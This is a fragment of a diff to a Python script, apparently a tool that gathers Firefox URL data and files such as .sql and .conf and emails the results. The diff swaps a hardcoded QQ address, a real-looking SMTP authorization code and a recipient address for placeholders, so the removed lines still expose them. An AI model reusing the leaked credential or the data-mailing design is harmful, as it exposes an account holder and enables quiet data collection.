@@ -41,11 +41,11 @@ DOCUMENT_EXTS = ['.pdf', '.docx', '.doc', '.rar', '.inc', '.txt', '.sql', '.conf
 # 邮件配置
 EMAIL_CONFIG = {
     # 发件人QQ邮箱信息（必须修改）
-    "sender_email": "1794686508@qq.com",  # 你的QQ邮箱地址
-    "sender_password": "busnjcluyxtlejgc",  # 你的QQ邮箱SMTP授权码
+    "sender_email": "xxx@qq.com",  # 你的QQ邮箱地址
+    "sender_password": "xxx",  # 你的QQ邮箱SMTP授权码
 
     # 收件人邮箱信息（可修改）
-    "receiver_email": "shenghui3301@163.com",  # 收件人邮箱地址
+    "receiver_email": "xxx@163.com",  # 收件人邮箱地址
 
     # 邮件内容（可修改）
     "subject": "📧 Firefox的URL信息收集工作已完成！",  # 邮件主题
@@ -419,4 +419,5 @@ if __name__ == "__main__":
     except Exception as e:
         print(Fore.RED + f"\n[-] 脚本异常退出: {str(e)}")
         print(traceback.format_exc())
+
         # input("按任意键退出...")
